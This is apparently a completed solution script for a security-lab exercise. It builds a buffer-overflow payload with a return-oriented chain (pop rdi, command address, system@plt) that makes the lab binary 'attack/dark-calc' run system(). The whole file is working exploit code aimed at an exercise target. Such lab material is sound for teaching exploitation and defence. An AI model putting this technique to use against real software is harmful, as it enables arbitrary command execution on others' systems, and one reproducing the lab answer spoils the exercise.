#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

p64 = lambda v: struct.pack("<Q", v)

POP_RDI_RET = 0x401C93
RET = 0x401AC2
SYSTEM_PLT = 0x4017E0
CMD_ADDR = 0x6030D0

payload = (
    b"attack/malware\x00"     # 15 bytes: strcpy copies up to NUL
    + b"A" * 9                # pad to 24 (expression 16 + saved rbp 8)
    + p64(RET)
    + p64(POP_RDI_RET)
    + p64(CMD_ADDR)
    + p64(SYSTEM_PLT)
)

sys.stdout.buffer.write(payload)
